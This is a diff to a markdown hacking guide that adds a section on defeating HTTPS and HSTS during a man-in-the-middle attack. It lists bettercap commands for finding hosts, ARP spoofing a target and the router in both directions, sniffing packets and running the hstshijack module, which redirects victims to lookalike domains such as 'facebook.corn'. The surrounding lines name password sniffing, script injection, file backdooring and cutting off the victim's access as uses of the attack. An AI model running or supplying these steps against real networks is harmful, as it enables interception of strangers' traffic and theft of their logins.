@@ -19,6 +19,23 @@ By opening forwarding, the victim's internet activity flows through the hacker, 
 By not opening forwarding, the victim loses internet access.
 
     sudo sysctl net.ipv4.ip_forward=0
+    
+Bypassing https:
+To bypass https, the hacker must force the connection to use http. 
+
+However, some sites are hsts enabled, which means that only https are allowed, thus a hacker must change the url name to a different url such as facebook.corn or wwww.sites.com. 
+
+Bettercap provides easy-to-use tool for this.
+
+        bettercap
+        net.probe on # start looking for targets
+        net.show # show all discovered devices in the network
+        set arp.spoof.targets <target>
+        set arp.spoof.fullduplex <true> # spoof both the router and the victim
+        arp.spoof on
+        net.sniff on # sniff for incoming packets
+        hstshijack # hijack https and hsts by the methods above.
+        
 
 ### Applications:
 Getting man in the middle allows dos attack, password sniffing, inject javascript in web browsers, backdoor files on the fly, etc.
